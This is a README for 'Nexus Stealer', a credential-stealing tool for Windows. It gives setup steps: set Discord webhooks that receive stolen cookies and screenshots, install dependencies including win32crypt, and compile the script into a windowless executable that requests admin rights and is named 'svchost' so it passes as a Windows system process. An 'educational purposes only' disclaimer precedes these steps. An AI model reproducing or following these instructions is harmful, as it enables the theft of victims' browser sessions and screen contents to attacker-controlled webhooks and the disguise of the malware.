# NEXUS STEALER

**Disclaimer**: This code is provided for **educational purposes only**. I do not endorse or encourage any misuse, illegal activities, or damage caused by this code. By using this script, you agree that **you are solely responsible** for your actions. I bears no liability for any consequences arising from the use of this tool.

---

## Explaination

Change the :
```
COOKIE_WEBHOOK_URLS = ["1", "1_test"]
SCREENSHOT_WEBHOOK_URLS = ["2", "2_test"]
```
By 4 **DIFFERENT** discord webhooks

Install the dependencies :
```
pip install psutil requests pywin32 pyautogui cryptography netifaces
```
Convert to .exe :
```
pyinstaller --onefile --noconsole --hidden-import psutil --hidden-import requests --hidden-import pywin32 --hidden-import pyautogui --hidden-import cryptography --hidden-import netifaces --hidden-import win32crypt --hidden-import win32gui --hidden-import win32con --hidden-import win32process --hidden-import win32security --hidden-import win32api --hidden-import win32file --uac-admin --name svchost NexusStealer.py
```
